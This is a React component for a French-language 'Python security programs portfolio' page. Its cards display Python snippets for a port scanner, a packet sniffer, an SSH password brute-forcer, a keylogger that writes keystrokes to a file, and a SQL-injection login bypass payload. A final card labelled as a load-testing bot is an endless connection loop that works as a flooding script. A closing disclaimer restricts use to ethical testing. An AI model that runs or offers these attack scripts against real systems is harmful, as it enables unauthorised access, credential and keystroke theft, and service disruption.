import { Code, Database, KeyRound, Lock, Network, Shield } from 'lucide-react';
import React from 'react';

const SecurityToolCard = ({ title, description, icon: Icon, codeSnippet }) => {
  const [isCodeVisible, setIsCodeVisible] = React.useState(false);

  return (
    <div className="bg-white rounded-lg shadow-md p-6 hover:shadow-xl transition-shadow duration-300 space-y-4">
      <div className="flex items-center space-x-4">
        <Icon className="text-blue-600 w-10 h-10" />
        <h3 className="text-xl font-semibold text-gray-800">{title}</h3>
      </div>
      <p className="text-gray-600">{description}</p>
      <div className="mt-4">
        <button 
          onClick={() => setIsCodeVisible(!isCodeVisible)}
          className="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 transition-colors"
        >
          {isCodeVisible ? 'Masquer le Code' : 'Voir le Code'}
        </button>
        {isCodeVisible && (
          <pre className="bg-gray-100 p-4 mt-4 rounded-lg overflow-x-auto text-sm">
            <code>{codeSnippet}</code>
          </pre>
        )}
      </div>
    </div>
  );
};

const PythonHackingPortfolio = () => {
  const tools = [
    {
      title: "Scanners de Ports",
      description: "Analyse des ports ouverts pour évaluer les points d'entrée potentiels.",
      icon: Network,
      codeSnippet: `import socket
ip = "192.168.1.1"
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((ip, port)) == 0:
        print(f"Port {port} is open")
    s.close()`
    },
    {
      title: "Sniffers de Paquets",
      description: "Interception et analyse des paquets réseau pour des audits de sécurité.",
      icon: Shield,
      codeSnippet: `from scapy.all import *
def packet_callback(packet):
    print(packet.summary())
sniff(prn=packet_callback, count=10)`
    },
    {
      title: "Bruteforce",
      description: "Test de mots de passe pour évaluer la robustesse des authentifications.",
      icon: Lock,
      codeSnippet: `import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
with open("passwords.txt", "r") as file:
    passwords = file.readlines()
    for password in passwords:
        try:
            ssh.connect('192.168.1.1', username='admin', password=password.strip())
            print(f"Password found: {password.strip()}")
            break
        except:
            pass`
    },
    {
      title: "Keyloggers",
      description: "Enregistrement des frappes au clavier pour tests de vulnérabilité.",
      icon: KeyRound,
      codeSnippet: `from pynput.keyboard import Listener
def log_keystroke(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key}\n")
with Listener(on_press=log_keystroke) as listener:
    listener.join()`
    },
    {
      title: "Exploitation Web",
      description: "Détection de vulnérabilités comme l'injection SQL et XSS.",
      icon: Database,
      codeSnippet: `import requests
url = "http://example.com/login"
data = {"username": "admin", "password": "' OR '1'='1"}
response = requests.post(url, data=data)
if "Welcome" in response.text:
    print("Vulnerability found: SQL Injection")`
    },
    {
      title: "Bots d'Automatisation",
      description: "Scripts pour tests de charge et simulation de requêtes réseau.",
      icon: Code,
      codeSnippet: `import socket
ip = "192.168.1.1"
port = 80
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"GET / HTTP/1.1\r\n\r\n")
    s.close()`
    }
  ];

  return (
    <div className="min-h-screen bg-gray-100 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-4xl font-bold text-center mb-12 text-gray-800">
          Portfolio de Programmes Python en Sécurité Informatique
        </h1>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
          {tools.map((tool, index) => (
            <SecurityToolCard 
              key={index}
              title={tool.title}
              description={tool.description}
              icon={tool.icon}
              codeSnippet={tool.codeSnippet}
            />
          ))}
        </div>
        <div className="mt-12 text-center text-gray-600">
          <p>
            <strong>Avertissement :</strong> Ces outils sont destinés uniquement à des fins de test 
            de sécurité éthique et légale. Toute utilisation malveillante est strictement interdite.
          </p>
        </div>
      </div>
    </div>
  );
};

export default PythonHackingPortfolio;